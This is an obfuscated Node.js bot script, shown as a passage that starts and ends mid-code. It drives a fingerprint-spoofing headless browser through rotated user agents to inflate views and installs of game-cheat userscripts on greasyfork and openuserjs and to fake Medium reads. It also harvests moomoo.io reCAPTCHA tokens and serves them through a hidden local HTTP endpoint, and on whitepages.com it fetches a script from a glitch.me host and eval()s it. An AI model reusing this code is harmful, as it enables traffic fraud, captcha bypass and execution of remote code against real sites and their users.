      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a3(0x1a)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + a2(0x1c) + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + a4(0x7, '&KIX') + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a3(0x0) + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a4(0x23, 'V*x0') + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + a2(0x4) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + a2(0x17) + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x19a9 * -0x1 + -0x18e5 + -0xc4
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a5 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xd * 0x7d + -0x2506 + 0x1ead)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k[a5(0x1e)];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x907 + -0xe09 * -0x1 + -0x49e), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x179a + -0x229 * 0x1 + -0x150d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x50 * -0x61 + -0x912 + 0x2762 * 0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1850 + 0x9 * 0x13 + -0x18fb; w < getRandomInt(-0x2 * -0x27 + -0xb57 * 0x3 + 0x21b8, 0x9a7 * 0x2 + 0x796 * -0x1 + 0x5 * -0x257); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xd4 * -0x191 + -0x1997f * -0x1 + 0x1b * -0x12c9);
        }
      }();
    }, 0x2465 + -0x14a9 + -0xf58), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1468 + -0x2e8 * 0xd + 0x3a30;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x283 + -0x5 * -0x20e + 0x7c3 * -0x1, -0xd1f + -0x22d4 + 0x3025)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1 * 0xcc7b + 0x4f2c + -0x5 * 0x214b);
    }, 0x1faa + 0x1393 + -0x1 * 0x32d9), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x18a + 0x2 * 0x12ee + -0x2452;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x8 * -0x40f + -0x1d7 + -0x12e9), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x82f + 0x2 * -0x3fd + 0x1029 * 0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x6 * 0x1f466 + 0x10757e + 0x90086);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x12c3 + -0xb03 * -0x3 + -0x3368);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x3b * -0x5b + -0x6a * -0x23 + 0x743);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process[a2(0x18)]['PORT'] || -0x3b93 + 0xc72 + 0x4eb1);
}
doFlags['doOUJS'] && ((async () => {
  const aa = b,
    a9 = d,
    a8 = c;
  async function f() {
    const a7 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x12eb * -0x2 + 0x3 * 0xbb9 + -0x2ac * -0x1) {
        const a6 = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1662 * 0x1 + 0x2e * 0x24 + -0x5 * -0x32f));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x3ff + 0xece + -0xacf, D['indexOf']('\x20'));
        return B ? E['slice'](-0x6 * -0x200 + -0xd8b * 0x2 + 0xf16, E[a6(0xd)]('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3361 + -0x1 * -0x45d1 + 0x14a0),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + a7(0x12) + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x331e + 0x899 + 0x5195),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + a7(0x20) + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + a8(0x10) + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + a9(0x8) + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + a9(0xb) + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + a8(0x13) + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + a8(0xf) + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + aa(0x1b, '(GX5') + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
